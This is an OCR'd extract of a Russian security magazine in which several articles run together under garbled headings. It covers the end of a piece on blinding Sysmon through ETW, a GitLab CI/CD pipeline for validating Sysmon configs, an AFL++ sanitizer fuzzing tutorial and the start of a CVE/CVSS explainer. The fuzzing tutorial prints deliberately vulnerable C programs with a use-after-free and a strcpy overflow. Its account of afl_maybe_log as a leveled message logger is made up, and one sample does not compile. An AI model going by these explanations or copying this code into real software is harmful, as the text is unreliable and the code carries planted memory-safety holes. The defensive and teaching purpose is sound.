для сессии трас сировки. Список DACL имеет сле дующий вид:


D:(A;;0x1800;;;WD)(A;;0x120fff;;;SY)(A;;0x120fff;;;LS)(A;;0x120fff;;;
NS)(A;;0x120fff;;;BA)(A;;0xee5;;;LU)(A;;LC;;;MU)(A;;0x1800;;;AC)(A;;
0x1800;;;S-1-15-3-1024-3153509613-960666767-3724611135-2725662640-
12138253-543910227-1950414635-4190290187)





По аналогии с провайдером ребутим хост, откры ваем оснастку «Просмотр
событий» и видим сле дующую картину.





И будет счастье нашему ата кующему, ну а для нас это полное разоча рова-
ние... На этот раз Sysmon даже ничего не скажет!
  Однако не все так плохо: если у тебя в инфраструктуре настроен WEC,
в журнале Microsoft-Windows-Eventlog-ForwardingPlugin/Operational
ты можешь обнаружить следующее событие.





ÂÛÂÎÄÛ

Нам удалось воспроизвести дей ствия ата кующе го и осле пить Sysmon,
манипулируя с подсистемой ETW. Конечно же, предел у фантазий хакеров
отсутс твует нап рочь: здесь еще огромное поле для творчества, и мы обя-
зательно про должим его осва ивать!
COVERSTORY





Кон фигурационный   файл   встро енно го
в Windows средства мониторинга Sysmon
может  разрастаться  до  тысячи  строк,
которые описыва ют правила отбо ра регис-
трируемых в логах событий. Стан дар тный              d3f0x0                                                                                                                 threat hunter,
набор функций Sysmon для про верки кон-              threat researcher
фига неудобен и затрудняет работу ана-
литика. В этой статье я покажу, как сос-
тавлять пайплайн CI/CD для валидации кон-
фига  Sysmon  и  сделать  невозможной
потерю событий.


Глав ная проб лема при работе с Sysmon в том, что в случае ошибки ты получа-
ешь текст с атрибутами XML-файла, как на кар тинке ниже.




                 Пример вывода ошибки Sysmon




                    Один из методов сос тавления кон фига Sysmon я
                      уже описал в статье на «Хабрахабре».


Ошиб ки могут быть связаны с опечатками, некоррек тны ми параметрами,
новыми типами событий — все они спо соб ны при вес ти к нарушению процес-
са мониторинга. Для автомати ческой про верки мы могли бы воспользоваться
схе мой XSD, которая не поставляется вмес те с Sysmon.




                     На GitHub был похожий про ект, автор описывал
                      XSD-схему для разных версий Sysmon и раз-
                       работал модули PowerShell. В настоящее время
                      про ект не под держивает ся.


Для решения проб лемы мы можем воспользовать ся подходом Detection-
as-Code (DaC). Для его реализации я воспользовался возможностями GitLab
CI/CD.




                      Прак тики DevOps набирают обо роты во всех сфе-
                       рах ИТ. Detection engineering не исклю чение —
                        кол лаборация получила название Detection-as-
                   Code.


ÊÐÀÒÊÎÅ ÂÂÅÄÅÍÈÅ Â DETECTION-AS-CODE

Detection-as-Code — это под ход включения практик DevOps в деятельность
ана лити ков SOC и CERT, а также инже неров по внедрению СЗИ и средств
мониторинга. DaC поз воляет структуриро вать управление пра вила ми обна-
ружения,  конфигурацион ными файлами,  провести  тес тирование до  их
использования в конечном продук те.
  В большинстве случаев для соз дания нового правила или редактирования
существующе го аналитику необ ходимо открыть встроенный редактор исполь-
зуемого про дукта. Изменения, вносимые в поль зовательском интерфейсе,
трудно и неудобно отслеживать. Подход DaC поз воляет быть уверенным, что
мы ничего не сломаем. В процессе CI/CD соз дава емый контент тестируется
до того, как он будет дос тавлен в целевую сис тему.


ÏÀÉÏËÀÉÍ

Ýòàïû
Мой пай плайн включает пять этапов:
 1. ".pre" — сбор ка Docker-кон тейнера.
 2. build — сбор ка конфига из модулей для нужной Sysmon версии схе мы.
 3. test-schema — тестирование получен ных конфигов на соответс твие схе-
  ме Sysmon.
 4. test-on-windows — тестирование конфигов на хостах (при необ-
   ходимости можно использовать Windows 10 и Windows 7, если нужен кон-
   фиг для легаси).
 5. deploy — доставка конфига до пользователей.





                 Пример вывода ошибки Sysmon

Так выг лядит начало файла .gitlab-ci.yml:


stages:
  - ".pre"
  - build
  - test-schema
  - test-on-windows
  - deploy


workflow:
  rules:
    - changes:
      - templates/* .xml

Клю чевое слово stages определя ет этапы в пайплай не, а workflow — пра-
вило, описывающее, когда он будет запус кать ся. Мой пайплайн запускается
только при изме нении модулей конфига.


Íóëåâîé ýòàï. Ñáîðêà îáðàçà Docker
Для сбор ки образа Docker я использую подход Docker-in-Docker. Docker-
файл также находится в репози тории. На этом этапе мы уста навливаем
Ansible, pywinrm и коллекцию  Ansible Community.Windows в собираемый
образ.


FROM python:3.12-bookworm
LABEL maintainer="d3f0x0"
RUN apt-get update && apt-get upgrade -y && pip install --upgrade pip
&& apt-get install ansible -y && pip3 install pywinrm && ansible-
galaxy collection install community.windows && apt-get clean
VOLUME [ "/data" ]
WORKDIR /data
CMD ["ansible-playbook", "--version"]

Job для GitLab выг лядит вот так:


build-docker:
  stage: ".pre"
  image: docker:dind
  tags:
    - docker
  services:
    - name: docker:dind
  script:
    - echo -n "$CI_REGISTRY_PASSWORD" | docker login -u
$CI_REGISTRY_USER $CI_REGISTRY --password-stdin
    - docker pull "$CI_REGISTRY_IMAGE:latest" || true
    - >
      docker build
      --pull
      --cache-from $CI_REGISTRY_IMAGE:latest
      --label "org.opencontainers.image.title=$CI_PROJECT_TITLE"
      --label "org.opencontainers.image.url=$CI_PROJECT_URL"
      --label "org.opencontainers.image.created=$CI_JOB_STARTED_AT"
      --label "org.opencontainers.image.revision=$CI_COMMIT_SHA"
      --label "org.opencontainers.image.version=$CI_COMMIT_REF_NAME"
      --tag $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
      .
    - docker push $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

В резуль тате образ будет добав лен в реестр Docker соответству юще го про-
екта GitLab. Его мы будем использовать на остальных этапах.


Ïåðâûé ýòàï. Áèëä êîíôèãà
Первый шаг в обеспечении надеж ности конфига Sysmon — это проверка
структуры XML-фай ла. XML должен быть валидным, чтобы Sysmon корректно
интерпре тировал конфиг.
  Я решил разделить свой конфиг по модулям, которые может регис три-
ровать драйвер Sysmon (ProcessCreate, NetworkConnection и так далее). Этот
спо соб используется в репозитории sysmon-modular.



                 Пример вывода ошибки Sysmon

Что бы мож но было работать с раз ными версиями Sysmon, я пре дус мотрел
вари ант, когда ито говый кон фиг собира ется на основе схем, поставля емых
вместе с Sysmon.
  Собирает конфиг скрипт merge_module.py, написанный на Python. Также
используется шаблон Jinja2 (cong.xml.j2).


<Sysmon schemaversion="{{ schemaversion }}">
    <HashAlgorithms> *</HashAlgorithms>
    <DnsLookup> True</DnsLookup>
    <CheckRevocation>True</CheckRevocation>
    <ArchiveDirectory>sysmon</ArchiveDirectory>
    <EventFiltering>
  {% for module in modules_files %}
      {% set event = module.split('.') %}
      {% if event[0] in event_schema %}
    {% include module %}
      {% endif %}
  {% endfor %}
    </EventFiltering>
</Sysmon>

Скрип ту на вход подается схе ма из Sysmon, а даль ше в соответствии со схе-
мой собирается ито говый конфиг.


SCHEMA_DIR = os.path.join(os.getcwd(),"schemas")
    MODULES_DIR = os.path.join(os.getcwd(),"templates")
    SYSMON_CONFIG_NAME = "config"


    if not os.path.isdir("output"):
  os.mkdir("output")


    try:
  for file in os.listdir(SCHEMA_DIR):
      schema = SysmonSchema(os.path.join(SCHEMA_DIR, file))
      schemaEvents = (schema.events.keys())
      environment = Environment(loader=FileSystemLoader(MODULES_DIR),
trim_blocks=True, lstrip_blocks=True)
      template = environment.get_template("config.xml.j2")


      configFilename = os.path.join("output",f"{schema.binaryversion}
_{SYSMON_CONFIG_NAME}.xml")


      content = template.render(schemaversion=schema.schemaversion,
modules_files=os.listdir(MODULES_DIR), event_schema=list(schema.
events.keys()))


      with open(configFilename, "w") as obj:
    obj.write(content)


    except FileExistsError:
  print(f"ERROR - File not found")
    except Exception as e:
  print(f"ERROR - New exeception - {e}")%

Job в pipeline GitLab выглядит сле дующим образом:


merge_configs:
  image: CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  stage: build
  before_script:
    - pip install -r requirements.txt
  script:
    - python3 merge_module.py
  artifacts:
    paths:
      - output/*
    expire_in: 30 min

Об рати внимание на ключевое слово artifacts, где мы определяем, что все
файлы из директории output/ будут передаваться между джобами и мы смо-
жем использовать их повторно.
  Ðå çóëüòàò: собранный конфиг Sysmon для соответс тву ющих схем.
  После про верки структуры XML нужно проверить параметры и значения
в самом кон фиге.


Âòîðîé ýòàï. Òåñòèðîâàíèå ñîáðàííûõ êîíôèãîâ íà ñîîòâåòñòâèå
ñõåìàì
Я поль зуюсь нес колькими схе мами и для каж дой создаю отдельный job
на эта пе test-schema.


test-config-schema-16:
  needs: [merge_configs]
  stage: test-schema
  image: CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  tags:
    - docker
  extends: .before_script_schema
  script:
    - python sysmonvalidate/sysmonvalidate.py output/16_config.xml
schemas/16_schema.xml

Для уменьшения объ ема кода я применяю атрибут extends, который поз-
воля ет повторно использовать код, в моем случае before_script.


.before_script_schema:
  before_script:
    - git submodule init
    - git submodule update

На этапе merge_configs мы указали артефакты и конфиги Sysmon, которые
валидируем на соот ветствие схемам при помощи скрипта sysmonvalidate.py.


python sysmonvalidate/sysmonvalidate.py output/16_config.xml schemas/
16_schema.xml

Давай посмотрим, что проверяется в текущей версии sysmonvalidate.py.
  Корректность вер сии конфига Sysmon и вер сии схе мы:


  if config_schemaversion > float(schema.schemaversion):
raise ConfigError(f"The configuration version is higher than the
schema version: "
      f"{config_schemaversion} > {schema.schemaversion}")

Кор рек тность наиме нова ния опций:


  config_options = [elem.tag for elem in root if elem.tag !=
'EventFiltering']
  for options in config_options:
if options not in schema.get_schema_options():
    raise ConfigError(f"Correctness of the names of the
configuration file options.\nSysmon -> "
          f"ERROR: {options}\n")

Значение атри бута groupRelation:


  for rulegroup in rule_group_element:
next_object = get_next_object(rulegroup)
if rulegroup.attrib['groupRelation'] not in ['and', 'or']:
    raise ConfigError(f"Values of the groupRelation attribute of the
RuleGroup element.\n"
          f"RuleGroup -> groupRelation: {next_object}\n")

Далее проверяются:
 • название пра вил фильтрации, нап ример Process Create;
 • значение атри бута onmatch, в котором ука зывается фильтр для отбора
   событий ProcessCreate onmatch="exclude"
 • данные подат рибута элемента event, например FileCreateTime;
 • ис поль зуемые  функции  филь тра ции,  нап ример:  is,   is   not,
  contains, contains any, image.


for objectrulegroup in rulegroup.findall(f".//{next_object.tag}"):
    # Check Names of filtering events
    if objectrulegroup.tag not in schema.events:
  raise ConfigError(f"Names of filtering events.\nRuleGroup -> ERROR:
 {next_object.tag}")
    # Check Values of the onmatch attribute of the filtering events
    if objectrulegroup.attrib['onmatch'] not in ['exclude', 'include'
]:
  raise ConfigError(f"Values of the onmatch attribute of the
filtering events\nRuleGroup -> {next_object.tag} -> onmatch")
    flagRuleName = False
    for rule in objectrulegroup.iter():
  if not flagRuleName:
      flagRuleName = True
      continue
  if rule.tag == "Rule":
      if rulegroup.attrib['groupRelation'] not in ['and', 'or']:
    raise ConfigError(f"Values of the groupRelation attribute of the
Rule element.\n"
          f"Rule -> groupRelation: {next_object}\n")
      continue


  # Sub-element data of the event element
  if rule.tag not in schema.events[next_object.tag] and rule.tag !=
"Rule":
      raise ConfigError(f"Sub-element data of the event element\n
RuleGroup -> {next_object.tag} -> ERROR: {rule.tag} = {rule.text}")


  # Used filters of the data element
  if not "condition" in rule.attrib:
      raise ConfigError(f"Elements without condition.\n {next_object.
tag} -> {rule.tag} -> {rule.text}")


  if rule.attrib['condition'] not in schema.filters :
      raise ConfigError(f"Used filters of the data element.\n
RuleGroup -> {next_object.tag} -> {rule.tag} -> {rule.attrib[
'condition']} "
            f"= {rule.text}")

Что не про веряется — это типы дан ных.
  Ðå çóëüòàò: конфиг про верен на соответс твие схемам.


Òðåòèé ýòàï. Òåñòèðîâàíèå íà õîñòàõ
Как говорит ся, тестов мало не бывает, поэто му на эта пе test-on-windows
тес тирование проводится пря мо на хостах. Я исполь зую нес колько виртуаль-
ных машин, несколь ко версий Sysmon (их мож но найти в Internet Archive)
и роль Ansible.




                   Я оптимизировал под свою задачу роль Ansible,
                      которую нашел на GitHub.


Job выглядит сле дующим образом:


test-windows-16:
  stage: test-on-windows
  needs: [merge_configs, test-config-schema-16]
  image: CI_REGISTRY_IMAGE:$CI_COMMIT_SHA
  tags:
    - docker
  script:
    - cp output/16_config.xml .ansible/ansible-role-sysmon/files/
config.xml
    - ansible-playbook -vvv -i .ansible/hosts.yml .ansible/main.yml
-e ansible_password=$ANSIBLE_PASSWORD
  allow_failure: true

В job test-windows-16 запус кается плейбук Ansible, который выпол няет сле-
дующие таски.
  Соз дает директорию, в которую копиру ются фай лы для будущих эта пов:


- name: (Windows) Create installation directory
  ansible.windows.win_file:
    path: "{{ sysmon_install_path }}"
    state: directory

Проверяет, установлен ли Sysmon:


- name: (Windows) Check if sysmon is installed
  ansible.windows.win_service:
    name: "{{ sysmon_servicename }}"
  register: sysmon_installed
  ignore_errors: true

Удаляет Sysmon, если он установлен:


- name: (Windows 7) Uninstall sysmon
  ansible.windows.win_command: "{{ sysmon_servicename }} -u"
  args:
    chdir: "{{ sysmon_install_path }}\"
  when:
    - sysmon_installed.exists
    - ansible_distribution_major_version | int == 6


- name: (Windows >7) Uninstall sysmon
  ansible.windows.win_command: "{{ sysmon_servicename }} -u"
  args:
    chdir: "{{ sysmon_install_path }}\"
  when:
    - sysmon_installed.exists
    - ansible_distribution_major_version | int > 6

Ко пирует файл Sysmon:


- name: (Windows 7) Upload sysmon sysmon binary
  ansible.windows.win_copy:
    src: files/14/{{ sysmon_binary }}
    dest: "{{ sysmon_install_path }}\\Sysmon64.exe"
    when:
      - ansible_distribution_major_version | int == 6


- name: (Windows > 7) Upload sysmon sysmon binary
  ansible.windows.win_copy:
    src: files/15/{{ sysmon_binary }}
    dest: "{{ sysmon_install_path }}\\Sysmon64.exe"
  when:
    - ansible_distribution_major_version | int > 6

Ко пирует конфигурационный файл и Eula.txt:


- name: (Windows) Upload Eula.txt
  ansible.windows.win_copy:
    src: files/Eula.txt
    dest: "{{ sysmon_install_path }}\\Eula.txt"


- name: (Windows) Upload sysmon configuration
  ansible.windows.win_copy:
    src: files/{{ sysmon_config }}
    dest: "{{ sysmon_install_path }}\\sysmonconfig.xml"


- name: (Windows 7) Install sysmon
  ansible.windows.win_command: "{{ sysmon_binary }} -i sysmonconfig.
xml -accepteula"
  args:
    chdir: "{{ sysmon_install_path }}"
  when:
    - ansible_distribution_major_version | int == 6

Устанав ливает Sysmon:


- name: (Windows > 7) Install sysmon
  ansible.windows.win_command: "{{ sysmon_binary }} -i sysmonconfig.
xml -accepteula"
  args:
    chdir: "{{ sysmon_install_path }}"
  when:
    - ansible_distribution_major_version | int > 6


- name: (Windows 7) Clean uninstall sysmon
  ansible.windows.win_command: "{{ sysmon_servicename }} -u"
  args:
    chdir: "{{ sysmon_install_path }}\"
  when:
    - ansible_distribution_major_version | int == 6

Удаляет Sysmon и загруженные фай лы:


- name: (Windows > 7) Clean uninstall sysmon
  ansible.windows.win_command: "{{ sysmon_servicename }} -u"
  args:
    chdir: "{{ sysmon_install_path }}\"
  when:
    - ansible_distribution_major_version | int > 6


- name: (Windows 7) Clean directory tools
  ansible.windows.win_file:
    path: C:\tools
    state: absent
  when:
    - ansible_distribution_major_version | int == 6


- name: (Windows >7) Clean directory tools
  ansible.windows.win_file:
    path: C:\tools
    state: absent
  when:
    - ansible_distribution_major_version | int > 6

Ðå çóëüòàò: проведе но тестирова ние на хос те.


×åòâåðòûé ýòàï. Äîñòàâêà ñîáðàííîãî êîíôèãà äî ïîëó÷àòåëÿ
Зак лючительный этап — это доставка рабочего кон фига. Выбор способа дос-
тавки зависит от метода, которым ты распространяешь Sysmon (GPO, SCCM,
Ansible, PS1 и так далее).
   Вот несколько при меров спо собов доставки:
 • заг рузка актуального конфига из репози тория;
 • ко пирование кон фига в SYSVOL;
 • распространение через Ansible.


ÂÛÂÎÄÛ

Описанный пайплайн — это при мер того, как можно организовать процесс
раз работ ки правил детектирования. Его мож но улучшить, добавив:
 • соз дание файла MSI, содер жащего конфиг, и исполняемого файла
   с помощью WiX Toolset;
 • ис поль зование пакетов;
 • ис поль зование релизов;
 • ис поль зование  Terraform  или  Vagrant  для  управления  виртуальными
  машинами, на которых проводятся тесты.

Эффективная валидация кон фигурационного файла Sysmon тре бует, по сути,
двух тех нологий: интегра ции с системами контроля версий и скриптов
для валидации.
ВЗЛОМ





Фаззинг,  как  ты, наверное,  зна ешь, —
это тех ника, которая позволяет авто мати-
зиро вать поиск уязвимостей в софте. Быва-
ет фаззинг методом «черного ящика», ког-
да  у  нас  нет  исходников  прог раммы,              Life-Hack                                                                                     Сообщество
а бывает осно ванный на пок рытии — то         ИБ-профессионалов                                                                         Наши каналы в Telegram
есть применя емый к исходникам. В этой
статье сос редото чимся на вто ром виде
и на при мере AFL++ разберем, какую роль
здесь игра ют санитайзеры и как их при-
менять.




                 О  фаззинге  методом  чер ного  ящика  читай
                        в статье «WinAFL на прак тике. Учим ся работать
                     фаззером и искать дыры в соф те».


Суть фаззинга зак лючается в том, чтобы автоматичес ки подавать программе
неп равильные или испорченные данные и отлавливать потенциальные уяз-
вимос ти.
  На све те существует множество фаз зеров: AFL++, libfuzz, WinAFL, CI Fuzz,
PeachTech Peach Fuzzer, FuzzDB, go-fuzz и про чие, в том числе самописные.
Фаззеры при менимы не толь ко для программ, но и для сайтов. Например,
wfuzz — это веб-фаззер, который нужен, что бы вводить любые данные
в любое поле HTTP-запроса.
  В этой статье идет речь о фаз зинге прог рамм. Нашим инструментом будет
AFL++ — фаззер, ори ентированный на покрытие. Это значит, что он собирает
информацию о пок рытии для каждого изменен ного вхо да, чтобы обна ружить
новые пути выполнения и потенциальные ошиб ки. Если у тебя есть исходник
программы, AFL может вставлять вызовы функций в начало каждого базового
блока, нап ример в функции и цик лы.
  О том, как при помощи AFL тестировать блекбоксы, написано множество
ста тей, в том числе о том, как его рас параллеливать. Но этот фаззер умеет
ком пилиро вать прог раммы и делать свои вставки в код, что облегчает фаз-
зинг. Такие встав ки называются санитай зерами.




                        Статья имеет озна комительный характер и пред-
                       назна чена для специалис тов по безопас ности,
                      про водящих тестирова ние в рамках контракта.
                       Автор  и  редак ция  не  несут  ответс твенности
                        за любой вред, причинен ный с применением
                       изложенной информа ции. Распространение вре-
                      донос ных прог рамм, наруше ние работы систем
                      и  нарушение  тайны  переписки  прес ледуются
                      по закону.



×ÒÎ ÒÀÊÎÅ ÑÀÍÈÒÀÉÇÅÐÛ?

Са нитай зеры — это утилиты, которые обычно пос тавля ются вмес те с ком-
пиляторами. Они помогают искать ошиб ки в коде во время исполнения. Если
обобщить, можно выделить три разновидности санитай зеров:
 • address — ищет ошиб ки работы с памятью;
 • thread — ищет проблемы в многопоточных вычис лени ях (состояние гонки);
 • undened — ищет неопределен ное поведение в программе.

Ис поль зование санитайзеров вместе с AFL++ — это хороший тон при фаз-
зинге, потому что с ними фаззер будет луч ше знать, какого рода ошиб ки ему
нуж но искать. С санитай зерами фаззинг всегда будет проходить успешнее,
чем без них.
  В AFL++ доступны разные санитай зеры, которые помога ют обнаружи вать
ошибки в коде. Вот краткое опи сание каж дого из них.
 1. AddressSanitizer (ASAN) пред назна чен для обна руже ния оши бок чтения
   или записи в память, таких как переполнение буфера или использование
   осво бож денной  памяти. Он  обес печива ет  детальную  информацию
  об ошибках и помогает в их отладке.
 2. MemorySanitizer (MSAN) приз ван обнаружить неинициализированную
   память. Он помогает выявить ошиб ки, свя занные с исполь зовани ем
   неинициализированных дан ных и способные при вести к непредсказуемо-
   му поведе нию программы.
 3. ThreadSanitizer (TSAN) предназначен для поиска гонок данных в мно-
   гопоточных программах. Он помогает выявить ситуации, когда несколько
   потоков одновре менно обращаются к одним и тем же данным, что иногда
   приводит к неп редска зуемым результатам.
 4. UndefinedBehaviorSanitizer  (UBSAN)  помогает  обнаружить  неоп-
   ределенное поведе ние в программе, такое как деление на ноль, перепол-
   нение целочисленных типов или неп равиль ное использование указате лей.
  Он пре дупреждает о таких проб лемах и помога ет предотвратить воз-
  можные ошиб ки.
 5. Control Flow Integrity (CFI) обеспечивает защиту от атак, связанных
   с изме нени ем потока управления прог раммы. Он про веря ет целос тность
   вызовов функций и предотвра щает нежелательные изменения потока
   выполнения.
 6. Safe-stack пред назна чен для защиты от перепол нения стека. Он обес-
   печивает допол нительные механизмы безопасности, чтобы предотвратить
   возможные ата ки, связанные с перепол нением стека.

В разных случаях могут пригодиться разные санитайзеры, в том числе
это зависит от особенностей и требований проекта.
  Нап ример, санитай зер ASAN может выявить следующие проб лемы:
 • Use-After-Free — исполь зование чанка кучи пос ле его освобождения;
 • HeapOverflow — переполнение одного чанка и добав ление данных
   в дру гой чанк;
 • StackOverflow — классическое перепол нение буфера.




                     Под робнее о возможностях ASAN читай в до-
                      кумен тации на GitHub.



ÒÅÍÅÂÀß ÏÀÌßÒÜ

Одна из техник, которую используют санитайзеры, — это теневая память.
По сути, они под держивают параллельную струк туру данных наряду с фак-
тической памятью программы, при этом каждый бит в теневой памяти соот-
ветствует 8 битам в фактичес кой памяти. Такая схема позволяет хранить
метаданные о  каж дом  выделе нии  памяти  и  обна руживать нарушения
при записи в нее.
  Нап ример, в программе определяется какой-то ука затель:


*address = ...;  // or: ... = *address;

Са нитай зер меняет его использование на такое:


if (IsPoisoned(address)) {
  ReportError(address, kAccessSize, kIsWrite);
}
*address = ...;  // or: ... = *address;

Са нитай зер помечает любую выс вобож даемую память как «отравленную»,
а затем следит за дос тупом к ней. Если произошло перепол нение буфера,
который  выделялся  через  malloc,  то  получа ется,  что  кто-то  пишет
в отравленную область, а в эту область писать нельзя. Так фаззер обнаружи-
вает баг.
  Подобная же ситуация и с переполнением буфера на стеке. Пред-
положим, у нас есть такая программа:


void foo() {
  char a[8];
  ...
  return;
}

Са нитай зер ее изменит на вот такую:


void foo() {
  char redzone1[32];  // 32-byte aligned
  char a[8];          // 32-byte aligned
  char redzone2[24];
  char redzone3[32];  // 32-byte aligned
  int  *shadow_base = MemToShadow(redzone1);
  shadow_base[0] = 0xffffffff;  // poison redzone1
  shadow_base[1] = 0xffffff00;  // poison redzone2, unpoison 'a'
  shadow_base[2] = 0xffffffff;  // poison redzone3
  ...
  shadow_base[0] = shadow_base[1] = shadow_base[2] = 0; // unpoison
all
  return;
}

Тут искусственно добав ляется отравленная область, и, если произой дет
запись в нее, фаззер сра ботает и сообщит о перепол нении.


ÊÎÌÏÈËÈÐÓÅÌ ÒÅÑÒÎÂÓÞ ÏÐÎÃÐÀÌÌÓ Ñ AFL-CLANG-FAST

В качестве подопытного для испытаний исполь зуем вот такую незамыс-
ловатую программу:


#include <stdio.h>


int main()
{
    char buf[256] = {0};
    char *a = 0;
    unsigned int size = read(0, buf, 256);
    if(size > 0 && buf[0] == 'H'){
        if(size > 1 && buf[1] == 'I'){
            if(size > 2 && buf[2] == '!'){
                a = 1;
            }
        }
    }
    if(a == 1){
        printf("g00d pwn\n");
    }
    return 0;
}

Для тестирова ния два раза ском пилируем прог рамму. Первый раз обыч ным
GCC, вто рой раз компилято ром a-clang-fast.
  Компиляция при помощи a-clang-fast выг лядит точ но так же, как и с GCC:


$ afl-clang-fast  main.c -o san.elf




                      Если скомпилиро вать не получается, сто ит про-
                        бовать варианты a-clang или a-gcc.


В результате мы получаем инстру ментированный бинарный файл. При ком-
пиляции ты увидишь сооб щение о том, что AFL нашел опре деленное количес-
тво места для инструмен тации и вставил свое логирование в места ветвле-
ния.





Для про вер ки работы скомпилирован ного таким обра зом бинар ного файла
можно прос то его запустить. Если программа пада ет, значит, фаззер будет
врать:



  $ ./san.elf
  HI!
  g00d pwn


Те перь заг ружу два бинарных фай ла в IDA Pro, что бы показать, как это все
выглядит внутри.


ÈÙÅÌ ÎÒËÈ×Èß ÁÈÍÀÐÍÛÕ ÔÀÉËÎÂ Ñ ÏÎÌÎÙÜÞ IDA PRO

Слева заг ружена оригинальная программа, ском пилированная с помощью
GCC. Справа — программа, скомпилен ная при помощи a-clang-fast.





Разница оче видна: AFL добавил функцию afl_maybe_log() для логирования
сообщения. Эта функция при нимает два аргумен та:
 • type — тип сообщения. Может принимать значения ERROR, WARNING,
  INFO или DEBUG;
 • msg — сообщение, которое нуж но залогировать.

Фун кция afl_maybe_log() будет выводить сообщение в стандартный вывод
только в том случае, если уро вень логирования установлен на значение
не ниже типа сооб щения. Нап ример, если уровень логирования установлен
на INFO, то сооб щения с типом ERROR и WARNING будут выведены в стандар-
тный вывод, а сооб щения с типом INFO и DEBUG — нет.
  Функция afl_maybe_log() использует ся для логирования событий, про-
исхо дящих во вре мя работы AFL++: ошибок, пре дупрежде ний, информации
о пок рытии кода и так далее.
   Вот при мер ее исполь зования:


afl_maybe_log(ERROR, "An error occurred!");
afl_maybe_log(WARNING, "A warning occurred!");
afl_maybe_log(INFO, "Some information");
afl_maybe_log(DEBUG, "Some debug information");

Здесь сообщение об ошиб ке будет выведено в стандар тный вывод, WARNING
уйдет туда же, а INFO — нет, потому что уровень логирования не уста новлен
на значение, которое не ниже типа этих сообщений.
   Точ но так же можно увидеть те самые семь инс тру ментариев, которые
вста вил ком пилятор.





ÔÀÇÇÈÍÃ

Как и в прошлый раз, нам нужно создать две директории: /in с тесткейсами
и /out — для вывода кра шей:


mkdir in; mkdir out; cd in; ragg2 -P 10 -r > 1.txt; cd ..




                     Ragg2 —  это  утилита  из  набора  Radare2,
                        с помощью которой мож но генерировать мусор-
                     ные строки. Нап ример, это удоб но, ког да нужно
                      вычислять данные для переполнения буфера.


Запускаем фаззер:


afl-fuzz -m none -i $PWD /in -o $PWD /out -- ./san.elf

Давай посмотрим, что делает каж дый из параметров:
 • -- — берется содержимое файлов, которые находятся в директории /in ;
 • -m none означает, что необ ходимо убрать огра ниче ние памяти для каж-
   дого запускаемого семпла. Это ускоряет фаззинг;
 • -i $PWD/in задает, какие тес ткейсы берем для фаззинга;
 • -o $PWD/out задает, куда будут вылетать мутированные данные.

Пос ле запуска наб людаем такую кар тину.





Внизу мож но увидеть состояние фаззера, в правом верхнем углу — количес-
тво циклов и количество крашей. Через пять минут поле state из состояния
started перейдет в состояние finished. Зна чит, фаз зинг закончился!





Все результаты мутирования входного фай ла находятся по пути $PWD/out/
default/queue. Давай посмотрим пос ледний файл.





Можно уви деть разницу меж ду входным фай лом и тем, что выдал фаззер.





Удобно, что фаззер сам сооб щает, когда все закон чилось.


ÂÒÎÐÎÉ ÏÐÈÌÅÐ ÑÀÍÈÒÀÉÇÅÐÀ

Допустим, у нас будет вот такая программа:


#include <stdio.h>
#include <string.h>


int main(int argc, const char *argv[])
{
    char *buffer = (char *)malloc(256);
    char *a = 0;
    unsigned int size = read(0, buf, 256);
    if(size > 0 && buf[0] == 'H'){
        if(size > 1 && buf[1] == 'I'){
            if(size > 2 && buf[2] == '!'){
                a = 1;
                free(buffer);
                strcpy(buffer, argv[1]);
                puts(buffer);
            }
        }
    }
    if(a == 1){
        printf("g00d pwn\n");
    }
    return 0;
}

Здесь в явном виде есть уязвимость Use-After-Free, но программа не падает
и ошибки никакой не выдает. Наша задача — про демонстрировать работу
санитай зера AFL++. Он должен обна ружить эту уязвимость, в то время
как при обыч ном запуске фаз зера, без санитайзеров, ничего произойти
не должно.
  Компилиро вать будем с флагом -fsanitize и в явном виде указываем,
какой тип ошиб ки интересу ет:


afl-clang-fast -fsanitize=address main.c -o binary.elf

Далее повторяем те же шаги, что и раньше:


mkdir in; mkdir out; cd in; ragg2 -P 10 -r > 1.txt; cd ..

И запускаем фаззер:


afl-fuzz -i $PWD /in -o $PWD/out ./binary.elf @@ $PWD /in




Ре зультат говорит о том, что была обнаруже на уязвимость Use-After-Free.
   Те перь проделаем такой же фокус, только без санитайзеров:


gcc main.c -o clear.elf

И запустим фаззер:


afl-fuzz -Q -D -i $PWD /in -o $PWD/out ./clear.elf @@ $PWD /in





Как видно, без санитайзера фаз зер работа ет намного дольше.


ÂÛÂÎÄÛ

Мы убедились, что санитайзеры — это удобная вещь, которую стоит исполь-
зовать при фаззинге, если есть такая возможность. Мож но указать самому
фаззеру, на какие дефекты ему стоит обращать вни мание.
  Пример, который мы рас смотрели, показал достоинства санитайзера:
фаззер адап тировался под код и заранее узнал, как ему надо двигать ся, что-
бы дой ти до конца программы. Благода ря санитай зерам AFL++ смог грамот-
но подобрать тесткейс.
ВЗЛОМ





Куда мы в первую оче редь смот рим, глядя
на очередную CVE’шку? Пра виль но, на уро-
вень угро зы, то есть оцен ку CVSS. Но быва-
ет,  что  эта цифра пло хо  соответствует
реальной  опас ности. В  этой  статье  я               az_AZ                                                                                       xdvyznq28qfn@proton.me
на примерах покажу, как это случает ся,
а так же погово рим о других проблемах
CVE.




CVE (Common Vulnerabilities and Exposures, «извес тные уяз вимости и рис-
ки») — это стандарти зиро ванный и обще доступный словарь уяз вимостей
в ПО и железе. Заведует им Национальный инсти тут стандартов и технологий
(NIST) в Соеди ненных Шта тах. Основная цель CVE — предоставить общий
язык, на котором можно было бы обсуждать уязвимос ти и работать с ними
в прог раммах. CVE используется во всем мире и делает взаимодействие
между  ИБ-специалис тами,  поставщи ками  и  иссле дователями  более
эффектив ным.



CVSS (Common  Vulnerability Scoring System, «сис тема оценки уязвимос-
тей») — еще один важный инстру мент. Он разработан форумом групп реаги-
рования на инци ден ты и безопасности (FIRST) в сотрудни честве с NIST.
CVSS — это стандартизированный метод оценки, в рамках которого уяз-
вимос ти можно назначить числовой балл, озна чающий степень угрозы.



Базовый балл основан на фун даментальных атрибутах уязвимос ти, которые
не меняются со вре менем. Вот главные метрики, которые при этом берутся
в расчет:
 • век тор атаки (Attack Vector, AV);
 • слож ность ата ки (Attack Complexity, AC);
 • тре буемые при виле гии (Privileges Required, PR);
 • взаимодей ствие с поль зователем (User Interaction, UI);
 • область (Scope, S);
 • метрики воздей ствия:
    • вли яние на конфиденциальность (Condentiality Impact, C),
    • вли яние на целос тность (Integrity Impact, I),
    • вли яние на доступность (Availability Impact, A).

